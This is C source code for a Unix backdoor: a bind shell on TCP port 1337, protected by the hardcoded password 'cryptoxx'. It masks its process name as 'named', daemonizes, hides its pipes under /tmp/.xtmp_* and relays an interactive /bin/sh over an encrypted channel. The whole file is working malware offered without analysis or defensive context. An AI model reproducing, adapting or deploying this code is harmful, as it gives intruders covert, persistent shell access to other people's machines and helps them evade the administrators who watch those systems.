#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <pwd.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <unistd.h>

#define	SHELL	"/bin/sh"		// shell to run
#define	SARG	"-i"			// shell parameters
#define	PASSWD	"cryptoxx"		// password (8 chars)
#define	PORT	1337			// port to bind shell
#define	FAKEPS	"named"			// process fake name
#define	SHELLPS	"sh"			// shells fake name
#define	PIPE0	"/tmp/.xtmp_0_0"	// pipe 1
#define	PIPE1	"/tmp/.xtmp_0_1"	// pipe 2

#define max(x,y)	x>y ? x:y

extern char *decrypt_string(char *, char *);
extern char *encrypt_string(char *, char *, char *);

int new_bitch(int, char **);

int main (int argc, char *argv[])
{
	int lsock, csock;
	struct sockaddr_in laddr, caddr;
	socklen_t len;
	pid_t pid;
	char *sargv[3];

	sargv[0] = SHELLPS;
#ifdef SARG
	sargv[1] = SARG;
	sargv[2] = NULL;
#else
	sargv[1] = NULL;	
#endif
	memset(argv[0], 0x0, strlen(argv[0]));
	strcpy(argv[0], FAKEPS);
	signal(SIGCHLD, SIG_IGN);
	if ((lsock = socket(AF_INET, SOCK_STREAM, 0)) == -1) exit(-1);
	len = sizeof(laddr);
	memset(&laddr, 0, len);	
	laddr.sin_addr.s_addr = htonl(INADDR_ANY);
	laddr.sin_family = AF_INET;
	laddr.sin_port = htons(PORT);
	if (bind(lsock, (const struct sockaddr *)&laddr, len) != 0) exit(-1);
	if (listen(lsock, 1) != 0) exit (-1);
	if ((pid = fork()) == -1) exit (-1);
	if (pid > 0) exit(0);
	setsid();

	while (1) {
		if((csock = accept(lsock, (struct sockaddr *)&caddr, &len)) < 0)
			exit(-1);
		if (fork() != 0) {
			new_bitch(csock, sargv);
			exit(0);
		}
		close(csock);
	}
}

int
new_bitch(int sock, char *sargv[])
{
	int pipe0, pipe1;
	pid_t pid;
	char enc[769], *dec;
	char buf1[1024], buf2[512], ppath0[256], ppath1[256];
	fd_set fdset;

	FD_ZERO(&fdset);	
	memset(ppath0, 0x0, sizeof(ppath0));
	memset(ppath1, 0x0, sizeof(ppath1));
	strcpy(ppath0, PIPE0);
	sprintf(ppath0+strlen(PIPE0), "%d", getpid());
	strcpy(ppath1, PIPE1);
	sprintf(ppath1+strlen(PIPE1), "%d", getpid());
	if ((mkfifo(ppath0, 0600) || mkfifo(ppath1, 0600)) != 0)
		perror("mknod");

	if ((pid = fork()) > 0) {
		/* MASTER PROCESS */
		pipe0 = open(ppath0, O_WRONLY);
		pipe1 = open(ppath1, O_RDONLY);
		while (1) {
			FD_SET(sock, &fdset);
			FD_SET(pipe1, &fdset);			
			select(max(sock,pipe1) + 1, &fdset, NULL, NULL, NULL);
			if (FD_ISSET(sock, &fdset)) {
				memset(buf1, 0, sizeof(buf1));
				if (read(sock, buf1, sizeof(buf1)) == 0) break; /* nasty trick to check if connection ended */
				dec = decrypt_string(PASSWD, buf1);
				write(pipe0, dec, strlen(dec));
			}
			if (FD_ISSET(pipe1, &fdset)) {
				memset(buf2, 0, sizeof(buf2));
				memset(enc, 0, sizeof(enc));
				if (read(pipe1, buf2, sizeof(buf2)-1) == 0) break;
				encrypt_string(PASSWD, buf2, enc);
				write(sock, enc, strlen(enc));
			}
		}
		shutdown(sock, 2);
		kill(pid, SIGKILL);
		close(pipe0); close(pipe1);
		unlink(ppath0); unlink(ppath1);
		return(0);
	}
	else if (pid == 0) {
		/* SHELL PROCESS */
		close(sock);
		pipe0 = open(ppath0, O_RDONLY);
		pipe1 = open(ppath1, O_WRONLY);
		dup2(pipe0, 0);
		dup2(pipe1, 1);
		dup2(pipe1, 2);
		execv(SHELL, sargv);
	}
	return(-1);
}
